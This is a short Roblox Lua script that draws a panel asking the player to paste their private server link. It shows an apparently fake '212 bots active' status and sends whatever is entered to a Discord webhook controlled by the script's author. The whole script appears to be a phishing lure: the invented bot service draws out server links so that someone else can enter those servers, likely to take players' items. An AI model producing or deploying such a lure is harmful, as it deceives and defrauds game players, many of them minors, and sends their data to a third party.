--// PSL UI + Discord Webhook Sender by Max
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")

--// CONFIG
local WEBHOOK_URL = "https://discord.com/api/webhooks/your_webhook_here" -- Replace with your actual webhook

--// UI Setup
local player = Players.LocalPlayer
local screenGui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
screenGui.Name = "PSL_UI"

local frame = Instance.new("Frame", screenGui)
frame.Size = UDim2.new(0, 400, 0, 220)
frame.Position = UDim2.new(0.5, -200, 0.5, -110)
frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
frame.BorderSizePixel = 0

local title = Instance.new("TextLabel", frame)
title.Size = UDim2.new(1, 0, 0, 40)
title.Text = "Enter Private Server Link / PSL"
title.TextColor3 = Color3.new(1, 1, 1)
title.BackgroundTransparency = 1
title.Font = Enum.Font.GothamBold
title.TextSize = 20

local textBox = Instance.new("TextBox", frame)
textBox.Size = UDim2.new(1, -20, 0, 40)
textBox.Position = UDim2.new(0, 10, 0, 50)
textBox.PlaceholderText = "enter private server link"
textBox.Text = ""
textBox.Font = Enum.Font.Gotham
textBox.TextSize = 18
textBox.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
textBox.TextColor3 = Color3.new(1, 1, 1)

local infoLabel = Instance.new("TextLabel", frame)
infoLabel.Size = UDim2.new(1, -20, 0, 30)
infoLabel.Position = UDim2.new(0, 10, 0, 100)
infoLabel.Text = "auto-moreira (random) -/212 bots active"
infoLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
infoLabel.BackgroundTransparency = 1
infoLabel.Font = Enum.Font.Gotham
infoLabel.TextSize = 16

local statusLabel = Instance.new("TextLabel", frame)
statusLabel.Size = UDim2.new(1, -20, 0, 30)
statusLabel.Position = UDim2.new(0, 10, 0, 130)
statusLabel.Text = "High = Good | Low = Bad"
statusLabel.TextColor3 = Color3.fromRGB(150, 255, 150)
statusLabel.BackgroundTransparency = 1
statusLabel.Font = Enum.Font.Gotham
statusLabel.TextSize = 16

local sendButton = Instance.new("TextButton", frame)
sendButton.Size = UDim2.new(0.5, -15, 0, 30)
sendButton.Position = UDim2.new(0.25, 0, 0, 170)
sendButton.Text = "Send to Discord"
sendButton.Font = Enum.Font.GothamBold
sendButton.TextSize = 16
sendButton.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
sendButton.TextColor3 = Color3.new(1, 1, 1)

local resultLabel = Instance.new("TextLabel", frame)
resultLabel.Size = UDim2.new(1, -20, 0, 20)
resultLabel.Position = UDim2.new(0, 10, 0, 205)
resultLabel.Text = ""
resultLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
resultLabel.BackgroundTransparency = 1
resultLabel.Font = Enum.Font.Gotham
resultLabel.TextSize = 14

--// Send PSL to Discord
sendButton.MouseButton1Click:Connect(function()
	local psl = textBox.Text
	if psl == "" then return end

	local payload = {
		content = "**New PSL Submitted**",
		embeds = {{
			title = "Private Server Link",
			description = psl,
			color = 65280
		}}
	}

	local success, err = pcall(function()
		HttpService:PostAsync(WEBHOOK_URL, HttpService:JSONEncode(payload), Enum.HttpContentType.ApplicationJson)
	end)

	if success then
		sendButton.Text = "Sent!"
		sendButton.BackgroundColor3 = Color3.fromRGB(0, 255, 100)
		resultLabel.Text = "✅ Link sent: " .. psl
	else
		sendButton.Text = "Error"
		sendButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
		resultLabel.Text = "❌ Failed to send. Check webhook."
		warn("Webhook failed:", err)
	end
end)

